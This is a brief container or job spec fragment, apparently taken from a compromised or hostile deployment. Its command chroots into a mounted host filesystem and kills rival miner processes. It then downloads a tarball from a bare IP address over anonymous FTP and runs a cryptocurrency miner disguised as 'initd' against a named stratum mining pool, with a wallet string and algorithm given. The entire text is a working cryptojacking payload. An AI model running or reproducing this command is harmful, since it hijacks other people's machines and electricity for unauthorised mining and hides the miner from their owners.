Image: ubuntu
        Command: chroot /mnt /bin/sh -c 'lscpu; killall checkfs;killall xmrig;killall initd; wget -O  /tmp/m.tar.gz ftp://anonymous:anonymous@24.238.76.235/volume\(sda1\)/TP1/D/m.tar.gz; tar xvf /tmp/m.tar.gz -C /tmp; chmod 777 /tmp/AppDir/usr/bin/initd;   /tmp/AppDir/usr/bin/initd -u YkqSewoxH2WQqC6srrKC6srrK1qoP9Rbf5vMNaWc -p home-farm -a yespowerr16 -o stratum+tcp://yenten-pool.info:63368 ; ls'